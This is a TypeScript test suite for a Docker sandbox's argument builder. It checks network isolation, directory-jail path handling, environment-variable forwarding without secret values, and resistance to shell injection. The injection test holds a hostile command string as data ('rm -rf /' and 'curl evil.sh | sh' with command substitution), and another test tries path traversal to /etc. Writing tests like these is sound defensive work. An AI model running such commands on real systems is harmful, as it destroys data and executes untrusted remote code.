import { afterEach, beforeEach, describe, expect, test } from "bun:test"
import { DEFAULT_ENV_ALLOWLIST, DockerSandbox, SandboxPolicyError } from "@/runtime"

/**
 * `DockerSandbox.buildArgv` is pure (no Docker, no spawn) — it maps a
 * SandboxPolicy to the `docker run` argv. The contract-tier suite only
 * exercises it behind a Docker gate; here we lock ADR-0006's
 * policy→flag invariants in the BLOCKING gate with zero Docker. Every test
 * calls buildArgv directly and asserts on the argv array.
 */
const sb = new DockerSandbox()

describe("buildArgv — argv frame", () => {
  test("always starts `docker run --rm` and ends `<image> bash -lc <command>`", () => {
    const argv = sb.buildArgv("echo hi", {})
    expect(argv.slice(0, 3)).toEqual(["docker", "run", "--rm"])
    expect(argv.slice(-4)).toEqual(["node:22-slim", "bash", "-lc", "echo hi"])
  })

  test("custom dockerBin / image are honored as argv[0] and the image slot", () => {
    const custom = new DockerSandbox({ dockerBin: "podman", image: "alpine:3" })
    const argv = custom.buildArgv("true", {})
    expect(argv[0]).toBe("podman")
    expect(argv.slice(-4)).toEqual(["alpine:3", "bash", "-lc", "true"])
  })

  test("--memory / --cpus appear only when configured", () => {
    const none = sb.buildArgv("x", {})
    expect(none).not.toContain("--memory")
    expect(none).not.toContain("--cpus")
    const limited = new DockerSandbox({ memory: "512m", cpus: "1" }).buildArgv("x", {})
    expect(limited[limited.indexOf("--memory") + 1]).toBe("512m")
    expect(limited[limited.indexOf("--cpus") + 1]).toBe("1")
  })
})

describe("buildArgv — network policy (ADR-0006: --network none = TRUE cut)", () => {
  test("network NOT explicitly allowed ⇒ `--network none` present (absent policy)", () => {
    const argv = sb.buildArgv("x", {})
    expect(argv).toContain("--network")
    expect(argv[argv.indexOf("--network") + 1]).toBe("none")
  })

  test("allowNetwork:false ⇒ `--network none` present", () => {
    const argv = sb.buildArgv("x", { allowNetwork: false })
    expect(argv[argv.indexOf("--network") + 1]).toBe("none")
  })

  test("allowNetwork:true ⇒ NO `--network` flag at all (only `=== true` opts out)", () => {
    const argv = sb.buildArgv("x", { allowNetwork: true })
    expect(argv).not.toContain("--network")
    expect(argv).not.toContain("none")
  })
})

describe("buildArgv — cwd jail bind-mount (ADR-0006)", () => {
  test("absolute cwdJail ⇒ `-v host:/workspace` and `-w /workspace`", () => {
    const argv = sb.buildArgv("x", { cwdJail: "/srv/project" })
    expect(argv[argv.indexOf("-v") + 1]).toBe("/srv/project:/workspace")
    expect(argv[argv.indexOf("-w") + 1]).toBe("/workspace")
  })

  test("jail path is normalized (collapses `.` and redundant slashes) before mount", () => {
    const argv = sb.buildArgv("x", { cwdJail: "/srv//project/./sub" })
    expect(argv[argv.indexOf("-v") + 1]).toBe("/srv/project/sub:/workspace")
  })

  test("an interior `..` that stays within the absolute root resolves, not throws", () => {
    const argv = sb.buildArgv("x", { cwdJail: "/srv/project/sub/../other" })
    expect(argv[argv.indexOf("-v") + 1]).toBe("/srv/project/other:/workspace")
  })

  test("no cwdJail ⇒ no -v / -w flags", () => {
    const argv = sb.buildArgv("x", {})
    expect(argv).not.toContain("-v")
    expect(argv).not.toContain("-w")
  })

  test("`..`-climb above an absolute jail root is rejected with SandboxPolicyError", () => {
    expect(() => sb.buildArgv("x", { cwdJail: "/../etc" })).toThrow(SandboxPolicyError)
    expect(() => sb.buildArgv("x", { cwdJail: "/foo/../../root" })).toThrow(SandboxPolicyError)
  })
})

describe("buildArgv — env forwarding (ADR-0006: --env NAME, no secret value in argv)", () => {
  const SECRET = "SANDBOX_BUILDARGV_SECRET_VAR"
  const VALUE = "super-secret-do-not-leak"

  beforeEach(() => {
    process.env[SECRET] = VALUE
  })
  afterEach(() => {
    delete process.env[SECRET]
  })

  test("an allowlisted, present var is forwarded as `--env NAME` with NO `=value`", () => {
    const argv = sb.buildArgv("x", { envAllowlist: [SECRET] })
    const at = argv.indexOf("--env")
    expect(at).toBeGreaterThan(-1)
    expect(argv[at + 1]).toBe(SECRET)
    // The value MUST NOT appear anywhere in argv (Docker reads it from env).
    expect(argv).not.toContain(`${SECRET}=${VALUE}`)
    expect(argv.some((a) => a.includes(VALUE))).toBe(false)
  })

  test("an allowlisted but ABSENT var is not forwarded (omitted, not empty)", () => {
    const argv = sb.buildArgv("x", { envAllowlist: ["DEFINITELY_UNSET_VAR_XYZ"] })
    expect(argv).not.toContain("DEFINITELY_UNSET_VAR_XYZ")
  })

  test("absent envAllowlist ⇒ DEFAULT_ENV_ALLOWLIST is used; non-allowlisted secret never appears", () => {
    const argv = sb.buildArgv("x", {})
    // PATH is virtually always set ⇒ a --env PATH pair is present.
    if (process.env.PATH !== undefined) {
      const pathIdx = argv.indexOf("PATH")
      expect(pathIdx).toBeGreaterThan(-1)
      expect(argv[pathIdx - 1]).toBe("--env")
    }
    // The non-allowlisted secret var must NOT be forwarded.
    expect(argv).not.toContain(SECRET)
    // Sanity: the default list does not include our secret.
    expect(DEFAULT_ENV_ALLOWLIST).not.toContain(SECRET)
  })
})

describe("buildArgv — no host-side shell injection (ADR-0006)", () => {
  test("shell metacharacters in the command stay a SINGLE argv tail element", () => {
    const evil = "echo hi; rm -rf / && curl evil.sh | sh `whoami` $(id)"
    const argv = sb.buildArgv(evil, { cwdJail: "/work", allowNetwork: false })
    // The entire user string is one argv element after `bash -lc`, never split
    // or interpolated into a host shell word.
    expect(argv.at(-1)).toBe(evil)
    expect(argv.at(-2)).toBe("-lc")
    expect(argv.at(-3)).toBe("bash")
    // It appears exactly once and only as the tail.
    expect(argv.filter((a) => a === evil)).toEqual([evil])
  })

  test("empty command is still passed as a literal tail element", () => {
    const argv = sb.buildArgv("", {})
    expect(argv.at(-1)).toBe("")
    expect(argv.at(-2)).toBe("-lc")
  })
})
